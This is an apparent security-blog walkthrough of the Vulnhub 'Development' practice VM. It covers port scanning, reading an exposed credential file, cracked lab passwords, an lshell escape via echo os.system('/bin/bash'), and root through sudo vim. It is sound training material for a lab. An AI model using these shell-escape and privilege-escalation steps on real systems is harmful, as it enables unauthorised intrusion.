@@ -1,0 +1,111 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="This machine reminds us of a DEVELOPMENT environment: misconfigurations rule the roost. This is designed for OSCP practice, and the original version of the machine was used for a CTF. It is now revived, and made more nefarious than the original. Development is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click here.
+Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment."><meta name=keywords content=",Vulnhub"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://fspxnky.github.io/development/><title>Development :: fspxnky — Security Blog</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Development"><meta itemprop=description content="This machine reminds us of a DEVELOPMENT environment: misconfigurations rule the roost. This is designed for OSCP practice, and the original version of the machine was used for a CTF. It is now revived, and made more nefarious than the original. Development is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click here.
+Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment."><meta itemprop=datePublished content="2022-04-13T02:50:29+08:00"><meta itemprop=dateModified content="2022-04-13T02:50:29+08:00"><meta itemprop=wordCount content="1222"><meta itemprop=keywords content="Vulnhub,"><meta name=twitter:card content="summary"><meta name=twitter:title content="Development"><meta name=twitter:description content="This machine reminds us of a DEVELOPMENT environment: misconfigurations rule the roost. This is designed for OSCP practice, and the original version of the machine was used for a CTF. It is now revived, and made more nefarious than the original. Development is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click here.
+Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment."><meta property="article:published_time" content="2022-04-13 02:50:29 +0800 +0800"></head><body><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>/home/fspxnky</span>
+<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=/tags>Tags</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><a href=https://fspxnky.github.io/development/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
+<span class=logo__text>cat ./Development.md</span>
+<span class=logo__cursor></span></div></a><p>Reading Time: 5 minutes and 33 seconds.</p><h2 class=post-title>Development</h2><div class=post-content><p>This machine reminds us of a DEVELOPMENT environment: misconfigurations rule the roost. This is designed for OSCP practice, and the original version of the machine was used for a CTF. It is now revived, and made more nefarious than the original. Development is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click <a href=https://www.vulnhub.com/entry/digitalworldlocal-development,280/>here</a>.</p><p>Feel free to contact the author at <a href=https://donavan.sg/blog>https://donavan.sg/blog</a> if you would like to drop a comment.</p><blockquote><p>The machine IP address is <code>192.168.50.132</code> for me, yours will be different. Do scan your network before proceeding with the attack. Do snapshot the machine before proceeding, in case we need to revert it once we are finish or we mess up the machine.</p></blockquote><h2 id=scanning>Scanning</h2><pre tabindex=0><code>sudo nmap -sS -p- 192.168.50.132 -oN initial.scan
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-12 14:55 EDT
+Nmap scan report for 192.168.50.132
+Host is up (0.0020s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+113/tcp  open  ident
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 4.37 seconds
+</code></pre><p>From the scan, it tells us that several port is open:</p><ul><li>SSH = Port 22</li><li>iDent = Port 113</li><li>Samba = Port 139 and 445</li><li>HTTP = Port 8080</li></ul><h2 id=enumeration>Enumeration</h2><h4 id=port-8080-http>Port 8080 (HTTP)</h4><blockquote><p>Doing enumeration in this machine initially was painful because of the IDS. Any brute-forcing on the web will ban us from doing anything for a few minutes.</p></blockquote><p>Navigating to port 8080 will bring us to the <code>Development Page</code>. Viewing the source code, there&rsquo;s a comment section where it tells us to look for the development secret page. So I navigate to /html_pages to see what I can find there.</p><img src=/Development/1.png class=center style=border-radius:8px><p>Heading to <code>/development.html</code> while still in <code>view-source</code> mode, I can see a comment section, which points me to <code>/developmentsecretpage</code>.</p><p>Heading to <code>/developmentsecretpage</code>, i can access to Patrick PHP page by clicking on the hyperlink. Upon clicking on it, I was signed in even without specifying any credentials. There&rsquo;s also a <code>Click here to log out</code> hyperlink, which will log us out from the page and login page can be seen after clicking on it.</p><img src=/Development/2.png class=center style=border-radius:8px><p>When attempt to log in with any credential, instead of error or any fail message, we are able to sign in. I also get an error message display on the site upon login in:</p><pre tabindex=0><code>Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335
+
+Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 336
+</code></pre><h2 id=initial-foothold>Initial Foothold</h2><h4 id=sensitive-data-disclosure>Sensitive Data Disclosure</h4><p>Searching a vulnerability for <code>slogin_lib.inc.php</code> lead to this: <a href=https://www.exploit-db.com/exploits/7444>https://www.exploit-db.com/exploits/7444</a></p><p>This vulnerability expose the system to <code>Remote File Inclusion</code> and <code>Sensitive Data Disclosure</code> but, we are interested in the latter. Login information are stored in a text file. The name of this file is set in <code>slogin_lib.inc.php</code>, which by default is <code>slog_users.txt</code>.</p><p>So, navigating to <code>http://192.168.50.132:8080/developmentsecretpage/slog_users.txt</code> will give us the login information:</p><img src=/Development/3.png class=center style=border-radius:8px><p>Cracking the hash using this <a href=https://hashes.com/en/decrypt/hash>tool</a> from the internet will give me their password in clear text except for the user <code>admin</code>:</p><p>intern:4a8a2b374f463b7aedbb44a066363b81 - <strong>12345678900987654321</strong>
+patrick:87e6d56ce79af90dbe07d387d3d0579e - <strong>P@ssw0rd25</strong>
+qiu:ee64497098d0926d198f54f6d5431f98 - <strong>qiu</strong></p><p>With this credential, i can now login as <code>intern</code> through SSH:</p><pre tabindex=0><code>ssh intern@192.168.50.132
+intern@192.168.50.132&#39;s password: 12345678900987654321
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-34-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Aug  3 21:00:18 UTC 2021
+
+  System load:  0.02               Processes:            108
+  Usage of /:   28.8% of 19.56GB   Users logged in:      0
+  Memory usage: 24%                IP address for ens18: 192.168.50.132
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+32 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Aug  3 20:59:11 2021 from 10.10.10.2
+Congratulations! You tried harder!
+Welcome to Development!
+Type &#39;?&#39; or &#39;help&#39; to get the list of allowed commands
+intern:~$
+</code></pre><h4 id=breaking-out-from-restricted-shell>Breaking out from Restricted Shell</h4><p>Upon ssh in to the machine, I can only use a few commands. This is known as <code>restricted shell</code>. By typing <code>?</code>, i can see the list of allowed commands:</p><pre tabindex=0><code>intern:~$ ls
+access	local.txt  work.txt
+intern:~$ cat local.txt
+*** unknown syntax: cat
+intern:~$ ?
+cd  clear  echo  exit  help  ll  lpath  ls
+intern:~$
+</code></pre><p>When i enter the <code>id</code> command, I was kicked out from the shell, along with a error message. An error message from <code>lshell.py</code>. <code>lshell.py</code> is a python based shell that enables to restrict commands for users.</p><pre tabindex=0><code>intern:~$ id
+Traceback (most recent call last):
+  File &#34;/usr/local/bin/lshell&#34;, line 27, in &lt;module&gt;
+    lshell.main()
+  File &#34;/usr/local/lib/python2.7/dist-packages/lshell.py&#34;, line 1165, in main
+    cli.cmdloop()
+  File &#34;/usr/local/lib/python2.7/dist-packages/lshell.py&#34;, line 385, in cmdloop
+    stop = self.onecmd(line)
+  File &#34;/usr/local/lib/python2.7/dist-packages/lshell.py&#34;, line 503, in onecmd
+    func = getattr(self, &#39;do_&#39; + cmd)
+  File &#34;/usr/local/lib/python2.7/dist-packages/lshell.py&#34;, line 134, in __getattr__
+    if self.check_path(self.g_line) == 1:
+  File &#34;/usr/local/lib/python2.7/dist-packages/lshell.py&#34;, line 303, in check_path
+    item = re.sub(&#39;^~&#39;, self.conf[&#39;home_path&#39;], item)
+  File &#34;/usr/lib/python2.7/re.py&#34;, line 155, in sub
+    return _compile(pattern, flags).sub(repl, string, count)
+TypeError: expected string or buffer
+Connection to 192.168.50.132 closed.
+</code></pre><p>Googling <code>lshell.py escape</code> on the internet will lead us to this website: <a href=https://www.aldeid.com/wiki/Lshell>https://www.aldeid.com/wiki/Lshell</a>. Under the Security section, there&rsquo;s a way to bypass lshell with os.system by using the <code>echo</code> command. Doing this will bypass the restricted shell and we are free to use whatever commands:</p><pre tabindex=0><code>intern:~$ echo os.system(&#39;/bin/bash&#39;)
+intern@development:~$ id
+uid=1002(intern) gid=1006(intern) groups=1006(intern)
+intern@development:~$ cat local.txt 
+Congratulations on obtaining a user shell. :)
+intern@development:~$
+</code></pre><h2 id=privileged-escalation>Privileged Escalation</h2><h4 id=intern-to-patrick>Intern to Patrick</h4><p>This is easy. We crack the password earlier with the online tool. Just switch user and ta-da !</p><pre tabindex=0><code>intern@development:~$ su patrick 
+Password: 
+patrick@development:/home/intern$ id
+uid=1001(patrick) gid=1005(patrick) groups=1005(patrick),108(lxd)
+</code></pre><h4 id=patrick-to-root>Patrick to Root</h4><p>I believe there&rsquo;s a few way on getting root from here. Running the command <code>id</code> show us that patrick is in <code>lxd</code> group. Running the command <code>sudo -l</code> tell us that patrick can run <code>vim</code> and <code>nano</code> as sudo too:</p><pre tabindex=0><code>patrick@development:/home/intern$ sudo -l
+Matching Defaults entries for patrick on development:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User patrick may run the following commands on development:
+    (ALL) NOPASSWD: /usr/bin/vim
+    (ALL) NOPASSWD: /bin/nano
+patrick@development:/home/intern$
+</code></pre><p>Since <code>vim</code> can run as sudo, i will get root by simply doing this:</p><pre tabindex=0><code>patrick@development:/home/intern$ sudo vim -c &#39;:!/bin/bash&#39;
+
+root@development:/home/intern# id
+uid=0(root) gid=0(root) groups=0(root)
+root@development:/home/intern# cd /root
+root@development:/root# ls
+iptables-rules  lshell-0.9.9  proof.txt  smb.conf  tcpdumpclock.sh
+root@development:/root# cat proof.txt 
+Congratulations on rooting DEVELOPMENT! :)
+root@development:/root#
+</code></pre><h2 id=summary>Summary</h2><p>My 3rd machine from Vulnhub ! I say from this machine, i spend a lot of time on Port 8080 during enumeration due to IDS kicks in. I believe i trigger it when i tried to brute-forcing directory. RShell is something new to me too. This machine taught me to actually search for <code>slogin_lib.inc.php</code> and <code>lshell.py</code>. If I have not done this, I will stuck here for hours and eventually will read the walkthrough.</p><p>I believe from Patrick to Root is supposed to be challenging but the online hash cracker made it easy. I think the author wanted us to create our own password dictionary from the hint in the <code>securitynotice.php</code>. Patrick password is <code>P@ssw0rd25</code>. He suggested to use password like <code>P@ssw0rd1</code>. The password expires every 30 days and he has been working for about 2 years + now. So its safe to assume that the number 25 in his password are actually his years in the company ! 25 months = 2 years 1 month. Or maybe I&rsquo;m just overthinking ! See you in the next post !</p></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://fspxnky.github.io/tags/vulnhub/>Vulnhub</a></span></p></div></main></div><footer class=footer></footer></div><script type=text/javascript src=/bundle.min.2d3d449fc0ff117f00ac91342a8f76cd5b710411d7a0254dbe75da3234d2f685d6a0c44cff60c414e90b6a149da8e4032c713c25e4e6838e2e3918dc0ad2e81c.js integrity="sha512-LT1En8D/EX8ArJE0Ko92zVtxBBHXoCVNvnXaMjTS9oXWoMRM/2DEFOkLahSdqOQDLHE8JeTmg44uORjcCtLoHA=="></script></body></html>
